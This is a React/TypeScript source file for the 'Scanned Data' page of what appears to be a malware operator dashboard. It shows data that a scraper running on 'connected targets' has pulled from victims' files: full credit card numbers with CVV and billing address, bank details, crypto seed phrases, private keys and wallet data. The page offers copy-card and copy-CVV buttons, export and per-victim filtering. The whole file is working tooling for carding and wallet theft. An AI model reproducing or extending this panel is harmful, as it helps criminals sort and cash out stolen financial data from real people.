import { useState, useEffect, useCallback } from 'react'
import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider'
import ClientFilter from '../../UI/ClientFilter'
import type { ClientInfo } from '../../UI/ClientFilter'
import { useDashboardStore } from '../../store/dashboardStore.ts'
import Modal from '../../UI/Modal'

interface ScannedEntry {
  id: number
  client_id: string
  data_type: string
  data_value: string
  source_file: string
  created_at: number
  client_hostname?: string
  client_username?: string
}

interface ParsedCC {
  cardNumber: string
  name: string
  expiry: string
  cvv: string
  address: string
}

const TYPE_COLORS: Record<string, string> = {
  credit_card:    'text-rose-400 bg-rose-900/20 border-rose-700/40',
  bank_info:      'text-amber-400 bg-amber-900/20 border-amber-700/40',
  crypto_address: 'text-emerald-400 bg-emerald-900/20 border-emerald-700/40',
  seed_phrase:    'text-violet-400 bg-violet-900/20 border-violet-700/40',
  private_key:    'text-red-400 bg-red-900/20 border-red-700/40',
  clipper:        'text-sky-400 bg-sky-900/20 border-sky-700/40',
  WALLET_FOUND:   'text-teal-400 bg-teal-900/20 border-teal-700/40',
  WALLET_STORAGE: 'text-teal-400 bg-teal-900/20 border-teal-700/40',
  LEVELDB_DATA:   'text-cyan-400 bg-cyan-900/20 border-cyan-700/40',
}

const TYPE_LABELS: Record<string, string> = {
  credit_card:    'Credit Card',
  bank_info:      'Bank Info',
  crypto_address: 'Crypto Address',
  seed_phrase:    'Seed Phrase',
  private_key:    'Private Key',
  clipper:        'Clipper Event',
  WALLET_FOUND:   'Wallet Found',
  WALLET_STORAGE: 'Wallet Storage',
  LEVELDB_DATA:   'LevelDB Data',
}

function fmtTime(ts: number) {
  return new Date(ts * 1000).toLocaleString('en-US', { hour12: false })
}

function truncate(str: string, max: number) {
  if (str.length <= max) return str
  return str.slice(0, max) + '...'
}

/** Parse enriched credit card format: cardnumber|name:X|exp:X|cvv:X|addr:X */
function parseCreditCard(raw: string): ParsedCC | null {
  const parts = raw.split('|')
  if (parts.length < 1) return null
  const cardNumber = parts[0]
  if (cardNumber.length < 13) return null

  const result: ParsedCC = { cardNumber, name: '', expiry: '', cvv: '', address: '' }
  for (let i = 1; i < parts.length; i++) {
    const [key, ...valParts] = parts[i].split(':')
    const val = valParts.join(':')
    if (key === 'name') result.name = val
    else if (key === 'exp') result.expiry = val
    else if (key === 'cvv') result.cvv = val
    else if (key === 'addr') result.address = val
  }
  return result
}

/** Mask card number showing only last 4 digits */
function maskCard(card: string): string {
  if (card.length < 8) return card
  return '•••• •••• •••• ' + card.slice(-4)
}

/** Get card brand from number */
function getCardBrand(card: string): string {
  if (/^4/.test(card)) return 'Visa'
  if (/^5[1-5]/.test(card)) return 'Mastercard'
  if (/^3[47]/.test(card)) return 'Amex'
  if (/^6(?:011|5)/.test(card)) return 'Discover'
  return 'Card'
}

export default function ScannedDataPage() {
  const { isConnected, subscribe, send } = useBridgeWebSocket()
  const { impersonateUserId, clients: cachedClients } = useDashboardStore()

  const [clients, setClients]       = useState<ClientInfo[]>([])
  const [clientId, setClientId]     = useState('all')
  const [entries, setEntries]       = useState<ScannedEntry[]>([])
  const [search, setSearch]         = useState('')
  const [typeFilter, setTypeFilter] = useState('all')
  const [previewEntry, setPreviewEntry] = useState<ScannedEntry | null>(null)
  const [loading, setLoading]       = useState(false)
  const [copiedKey, setCopiedKey]   = useState<string | null>(null)

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopiedKey(key)
      setTimeout(() => setCopiedKey(null), 1500)
    })
  }

  useEffect(() => {
    if (cachedClients.length > 0) {
      setClients(cachedClients as ClientInfo[])
    }
  }, [cachedClients])

  // Load data
  const loadData = useCallback(() => {
    if (!isConnected) return
    setLoading(true)
    if (clientId === 'all') {
      send({ type: 'db_query', query: 'get_all_scanned_data', limit: 1000, impersonateUserId: impersonateUserId ?? undefined })
    } else {
      send({ type: 'db_query', query: 'get_scanned_data', clientId, limit: 1000, impersonateUserId: impersonateUserId ?? undefined })
    }
  }, [isConnected, send, clientId, impersonateUserId])

  useEffect(() => {
    loadData()
  }, [loadData])

  // DB responses
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('db_response', (msg: any) => {
      if (msg.query === 'get_all_scanned_data' || msg.query === 'get_scanned_data') {
        setEntries(msg.data || [])
        setLoading(false)
      }
    })
    const unsub2 = subscribe('client_list', (msg: any) => {
      if (Array.isArray(msg.clients)) setClients(msg.clients)
    })
    return () => { unsub(); unsub2() }
  }, [isConnected, subscribe])

  // Live scraper data stream
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('scraped_data', (msg: any) => {
      loadData()
    })
    return () => unsub()
  }, [isConnected, subscribe, loadData])

  const handleClientChange = (id: string) => {
    setClientId(id)
  }

  const handleDelete = (entry: ScannedEntry) => {
    send({ type: 'db_query', query: 'delete_scanned_data', id: entry.id, clientId: entry.client_id, impersonateUserId: impersonateUserId ?? undefined })
    setEntries(prev => prev.filter(e => e.id !== entry.id))
    if (previewEntry?.id === entry.id) setPreviewEntry(null)
  }

  const handleClearAll = () => {
    if (!confirm('Delete all scanned data entries?')) return
    send({ type: 'db_query', query: 'delete_all_scanned_data', impersonateUserId: impersonateUserId ?? undefined })
    setEntries([])
    setPreviewEntry(null)
  }

  const handleExport = () => {
    const lines = filtered.map(e =>
      `[${fmtTime(e.created_at)}] ${e.data_type} | ${e.client_hostname || e.client_id}\n  Value: ${e.data_value}\n  Source: ${e.source_file || 'N/A'}\n`
    ).join('\n')
    const blob = new Blob([lines], { type: 'text/plain' })
    const a = document.createElement('a')
    a.href = URL.createObjectURL(blob)
    a.download = `scanned-data-${Date.now()}.txt`
    a.click()
  }

  // Get unique data types for filter
  const dataTypes = Array.from(new Set(entries.map(e => e.data_type)))

  const filtered = entries.filter(e => {
    if (typeFilter !== 'all' && e.data_type !== typeFilter) return false
    if (search.trim()) {
      const q = search.toLowerCase()
      return e.data_value.toLowerCase().includes(q) ||
             (e.source_file || '').toLowerCase().includes(q) ||
             (e.client_hostname || '').toLowerCase().includes(q)
    }
    return true
  })

  const typeCounts: Record<string, number> = {}
  for (const e of entries) {
    typeCounts[e.data_type] = (typeCounts[e.data_type] || 0) + 1
  }

  // Parse preview value
  let previewDisplay = previewEntry?.data_value || ''
  try {
    const parsed = JSON.parse(previewDisplay)
    if (parsed.value) previewDisplay = parsed.value
  } catch {}

  const previewCC = previewEntry?.data_type === 'credit_card' ? parseCreditCard(previewDisplay) : null

  return (
    <div className="flex flex-col h-full space-y-4 min-h-0">

      {/* ── Header ─────────────────────────────────────────────────────── */}
      <div className="flex items-start justify-between flex-wrap gap-3">
        <div>
          <h3 className="text-2xl font-semibold text-slate-100 tracking-tight">
            Scanned Data
          </h3>
          <p className="text-sm text-slate-500 mt-0.5">
            Auto-extracted credit cards, bank info, crypto addresses, seed phrases, private keys & wallet data from target files.
          </p>
        </div>
        <div className="flex items-center gap-2 flex-wrap">
          <button onClick={loadData} disabled={loading}
            className="px-3 py-1.5 text-xs font-medium rounded-md bg-slate-800 text-slate-300 border border-slate-700 hover:bg-slate-700 disabled:opacity-40 transition-all">
            {loading ? 'Loading...' : 'Refresh'}
          </button>
          <button onClick={handleExport} disabled={!filtered.length}
            className="px-3 py-1.5 text-xs font-medium rounded-md bg-slate-800 text-slate-300 border border-slate-700 hover:bg-slate-700 disabled:opacity-40 transition-all">
            Export
          </button>
          <button onClick={handleClearAll} disabled={!entries.length}
            className="px-3 py-1.5 text-xs font-medium rounded-md bg-red-600/15 text-red-400 border border-red-700/40 hover:bg-red-600/25 disabled:opacity-40 transition-all">
            Clear All
          </button>
        </div>
      </div>

      {/* ── Stats bar ───────────────────────────────────────────────────── */}
      <div className="flex items-center gap-3 flex-wrap text-[11px] text-slate-500">
        <span className="text-slate-400">{entries.length} total items</span>
        {Object.entries(typeCounts).map(([type, count]) => (
          <span key={type} className={`px-2 py-0.5 rounded-full text-[10px] font-medium border ${TYPE_COLORS[type] || 'text-slate-400 bg-slate-800 border-slate-700'}`}>
            {TYPE_LABELS[type] || type}: {count}
          </span>
        ))}
      </div>

      {/* ── Controls row ────────────────────────────────────────────────── */}
      <div className="flex items-center gap-3 flex-wrap">
        <ClientFilter
          clients={clients}
          value={clientId}
          onChange={handleClientChange}
          allowAll
          allLabel="All clients"
          placeholder="Select target..."
        />

        <select
          value={typeFilter}
          onChange={e => setTypeFilter(e.target.value)}
          className="px-3 py-1.5 text-xs bg-slate-900 border border-slate-700 rounded-md text-slate-300 focus:outline-none focus:border-slate-500"
        >
          <option value="all">All types</option>
          {dataTypes.map(t => (
            <option key={t} value={t}>{TYPE_LABELS[t] || t}</option>
          ))}
        </select>

        <div className="relative flex-1 min-w-50">
          <input
            type="text"
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search values, source files, hostnames..."
            className="w-full pl-4 pr-8 py-1.5 bg-slate-900 border border-slate-700 rounded-md text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:border-slate-500"
          />
          {search && (
            <button onClick={() => setSearch('')}
              className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 text-xs">
              ×
            </button>
          )}
        </div>
      </div>

      {/* ── Results ─────────────────────────────────────────────────────── */}
      <div className="flex-1 min-h-0 bg-slate-950 border border-slate-800 rounded-lg overflow-y-auto">
        {filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-64 text-slate-600 gap-3">
            <span className="text-4xl opacity-20">🔍</span>
            {entries.length === 0
              ? <span>No scanned data yet. Data scraper runs automatically on connected targets.</span>
              : <span>No results match your filters.</span>
            }
          </div>
        ) : (
          <div className="divide-y divide-slate-800/50">
            {filtered.map(entry => {
              let displayValue = entry.data_value
              try {
                const parsed = JSON.parse(entry.data_value)
                if (parsed.value) displayValue = parsed.value
              } catch {}

              // For credit cards, show masked + extra info in the list
              const cc = entry.data_type === 'credit_card' ? parseCreditCard(displayValue) : null
              const listDisplay = cc
                ? `${maskCard(cc.cardNumber)}${cc.name ? ' — ' + cc.name : ''}${cc.expiry ? ' (' + cc.expiry + ')' : ''}`
                : displayValue

              return (
                <div key={entry.id} className="hover:bg-slate-900/60 transition-colors group">
                  <div className="flex items-start gap-3 px-4 py-2.5">
                    {/* Type badge */}
                    <div className="flex-none w-28">
                      <span className={`inline-block px-2 py-0.5 text-[10px] font-bold rounded-full border ${TYPE_COLORS[entry.data_type] || 'text-slate-400 bg-slate-800 border-slate-700'}`}>
                        {TYPE_LABELS[entry.data_type] || entry.data_type}
                      </span>
                    </div>

                    {/* Value - click to preview */}
                    <div className="flex-1 min-w-0">
                      <div
                        className="text-sm text-slate-200 font-mono break-all cursor-pointer hover:text-sky-300 transition-colors"
                        onClick={() => setPreviewEntry(entry)}
                        title="Click to preview"
                      >
                        {truncate(listDisplay, 120)}
                      </div>
                      {entry.source_file && (
                        <div className="text-[10px] text-slate-600 mt-1 truncate" title={entry.source_file}>
                          📁 {entry.source_file}
                        </div>
                      )}
                    </div>

                    {/* Meta */}
                    <div className="flex-none text-right text-[10px] text-slate-600 whitespace-nowrap">
                      <div>{fmtTime(entry.created_at)}</div>
                      <div className="text-slate-500">{entry.client_hostname || entry.client_id.slice(0, 8)}</div>
                    </div>

                    {/* Delete */}
                    <button
                      onClick={() => handleDelete(entry)}
                      className="flex-none opacity-0 group-hover:opacity-100 text-rose-500 hover:text-rose-400 p-1 hover:bg-rose-500/10 rounded transition-all"
                      title="Delete entry"
                    >
                      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                      </svg>
                    </button>
                  </div>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* ── Preview Modal ───────────────────────────────────────────────── */}
      <Modal
        open={!!previewEntry}
        onClose={() => setPreviewEntry(null)}
        title={previewEntry ? `${TYPE_LABELS[previewEntry.data_type] || previewEntry.data_type} Preview` : ''}
        width="640px"
      >
        {previewEntry && (
          <div className="space-y-4">
            {/* Metadata row */}
            <div className="flex items-center gap-3 text-xs text-slate-500">
              <span className={`inline-block px-2 py-0.5 text-[10px] font-bold rounded-full border ${TYPE_COLORS[previewEntry.data_type] || 'text-slate-400 bg-slate-800 border-slate-700'}`}>
                {TYPE_LABELS[previewEntry.data_type] || previewEntry.data_type}
              </span>
              <span>Client: {previewEntry.client_hostname || previewEntry.client_id.slice(0, 8)}</span>
              <span>{fmtTime(previewEntry.created_at)}</span>
            </div>

            {/* Source file */}
            {previewEntry.source_file && (
              <div>
                <label className="block text-[11px] text-slate-500 mb-1 font-medium uppercase tracking-wider">Source File</label>
                <div className="text-xs text-slate-400 bg-slate-900 rounded-md px-3 py-2 border border-slate-800 break-all">
                  {previewEntry.source_file}
                </div>
              </div>
            )}

            {/* ── Credit Card Preview ── */}
            {previewCC ? (
              <div className="space-y-3">
                {/* Card visual */}
                <div className="bg-gradient-to-br from-slate-800 to-slate-900 rounded-xl p-5 border border-slate-700 shadow-lg">
                  <div className="flex items-center justify-between mb-6">
                    <span className="text-[10px] text-slate-500 uppercase tracking-widest font-medium">{getCardBrand(previewCC.cardNumber)}</span>
                    <span className="text-[10px] text-slate-400 font-mono">{previewCC.cvv || <span className="text-slate-600 italic">no cvv</span>}</span>
                  </div>
                  <div className="text-lg text-slate-100 font-mono tracking-widest mb-4">
                    {maskCard(previewCC.cardNumber)}
                  </div>
                  <div className="flex items-center gap-6">
                    <div className="flex-1">
                      <div className="text-[9px] text-slate-500 uppercase tracking-wider mb-0.5">Cardholder</div>
                      <div className={`text-sm font-medium ${previewCC.name ? 'text-slate-200' : 'text-slate-600 italic'}`}>
                        {previewCC.name || 'Not captured'}
                      </div>
                    </div>
                    <div>
                      <div className="text-[9px] text-slate-500 uppercase tracking-wider mb-0.5">Expires</div>
                      <div className={`text-sm font-mono ${previewCC.expiry ? 'text-slate-200' : 'text-slate-600 italic'}`}>
                        {previewCC.expiry || '—'}
                      </div>
                    </div>
                    <div>
                      <div className="text-[9px] text-slate-500 uppercase tracking-wider mb-0.5">CVV</div>
                      <div className={`text-sm font-mono ${previewCC.cvv ? 'text-slate-200' : 'text-slate-600 italic'}`}>
                        {previewCC.cvv || '—'}
                      </div>
                    </div>
                  </div>
                </div>

                {/* Details table — always shows all fields */}
                <div className="grid grid-cols-2 gap-2">
                  <div className="bg-slate-900 rounded-md p-3 border border-slate-800">
                    <div className="text-[10px] text-slate-500 uppercase tracking-wider mb-1">Card Number</div>
                    <div className="text-sm text-slate-200 font-mono break-all">{previewCC.cardNumber}</div>
                  </div>
                  <div className="bg-slate-900 rounded-md p-3 border border-slate-800">
                    <div className="text-[10px] text-slate-500 uppercase tracking-wider mb-1">Cardholder Name</div>
                    <div className={`text-sm ${previewCC.name ? 'text-slate-200' : 'text-slate-600 italic'}`}>
                      {previewCC.name || 'Not captured'}
                    </div>
                  </div>
                  <div className="bg-slate-900 rounded-md p-3 border border-slate-800">
                    <div className="text-[10px] text-slate-500 uppercase tracking-wider mb-1">Expiry Date</div>
                    <div className={`text-sm font-mono ${previewCC.expiry ? 'text-slate-200' : 'text-slate-600 italic'}`}>
                      {previewCC.expiry || 'Not captured'}
                    </div>
                  </div>
                  <div className="bg-slate-900 rounded-md p-3 border border-slate-800">
                    <div className="text-[10px] text-slate-500 uppercase tracking-wider mb-1">CVV / CVC</div>
                    <div className={`text-sm font-mono ${previewCC.cvv ? 'text-slate-200' : 'text-slate-600 italic'}`}>
                      {previewCC.cvv || 'Not captured'}
                    </div>
                  </div>
                  <div className="col-span-2 bg-slate-900 rounded-md p-3 border border-slate-800">
                    <div className="text-[10px] text-slate-500 uppercase tracking-wider mb-1">Billing Address</div>
                    <div className={`text-sm ${previewCC.address ? 'text-slate-200' : 'text-slate-600 italic'}`}>
                      {previewCC.address || 'Not captured'}
                    </div>
                  </div>
                </div>

                {/* Raw value — lets user confirm exactly what was received */}
                <div>
                  <label className="block text-[11px] text-slate-500 mb-1 font-medium uppercase tracking-wider">Raw Value (from scraper)</label>
                  <div className="bg-slate-950 rounded-md border border-slate-800 px-3 py-2">
                    <pre className="text-[11px] text-slate-500 font-mono whitespace-pre-wrap break-all m-0">{previewDisplay}</pre>
                  </div>
                </div>

                {/* Actions */}
                <div className="flex items-center gap-2 pt-1">
                  <button
                    onClick={() => copyToClipboard(previewCC.cardNumber, 'card')}
                    className={`px-3 py-1.5 text-xs font-medium rounded-md border transition-all ${
                      copiedKey === 'card'
                        ? 'bg-emerald-600/20 text-emerald-400 border-emerald-600/40'
                        : 'bg-slate-800 text-slate-300 border-slate-700 hover:bg-slate-700'
                    }`}
                  >
                    {copiedKey === 'card' ? 'Copied!' : 'Copy Card Number'}
                  </button>
                  {previewCC.cvv && (
                    <button
                      onClick={() => copyToClipboard(previewCC.cvv, 'cvv')}
                      className={`px-3 py-1.5 text-xs font-medium rounded-md border transition-all ${
                        copiedKey === 'cvv'
                          ? 'bg-emerald-600/20 text-emerald-400 border-emerald-600/40'
                          : 'bg-slate-800 text-slate-300 border-slate-700 hover:bg-slate-700'
                      }`}
                    >
                      {copiedKey === 'cvv' ? 'Copied!' : 'Copy CVV'}
                    </button>
                  )}
                  <button
                    onClick={() => { handleDelete(previewEntry); setPreviewEntry(null) }}
                    className="px-3 py-1.5 text-xs font-medium rounded-md bg-red-600/15 text-red-400 border border-red-700/40 hover:bg-red-600/25 transition-all"
                  >
                    Delete
                  </button>
                </div>
              </div>
            ) : (
              /* ── Non-CC Preview ── */
              <>
                {/* Full value */}
                <div>
                  <label className="block text-[11px] text-slate-500 mb-1 font-medium uppercase tracking-wider">Extracted Value</label>
                  <div className="bg-slate-900 rounded-md border border-slate-800 overflow-hidden">
                    <pre className="text-sm text-slate-200 font-mono p-4 overflow-x-auto whitespace-pre-wrap break-all max-h-80 overflow-y-auto m-0">
                      {previewDisplay}
                    </pre>
                  </div>
                </div>

                {/* Raw JSON */}
                {previewEntry.data_value !== previewDisplay && (
                  <div>
                    <label className="block text-[11px] text-slate-500 mb-1 font-medium uppercase tracking-wider">Raw Data</label>
                    <div className="bg-slate-900 rounded-md border border-slate-800 overflow-hidden">
                      <pre className="text-[11px] text-slate-400 font-mono p-3 overflow-x-auto whitespace-pre-wrap break-all max-h-40 overflow-y-auto m-0">
                        {previewEntry.data_value}
                      </pre>
                    </div>
                  </div>
                )}

                {/* Actions */}
                <div className="flex items-center gap-2 pt-2">
                  <button
                    onClick={() => copyToClipboard(previewDisplay, 'value')}
                    className={`px-3 py-1.5 text-xs font-medium rounded-md border transition-all ${
                      copiedKey === 'value'
                        ? 'bg-emerald-600/20 text-emerald-400 border-emerald-600/40'
                        : 'bg-slate-800 text-slate-300 border-slate-700 hover:bg-slate-700'
                    }`}
                  >
                    {copiedKey === 'value' ? 'Copied!' : 'Copy Value'}
                  </button>
                  <button
                    onClick={() => { handleDelete(previewEntry); setPreviewEntry(null) }}
                    className="px-3 py-1.5 text-xs font-medium rounded-md bg-red-600/15 text-red-400 border border-red-700/40 hover:bg-red-600/25 transition-all"
                  >
                    Delete
                  </button>
                </div>
              </>
            )}
          </div>
        )}
      </Modal>
    </div>
  )
}
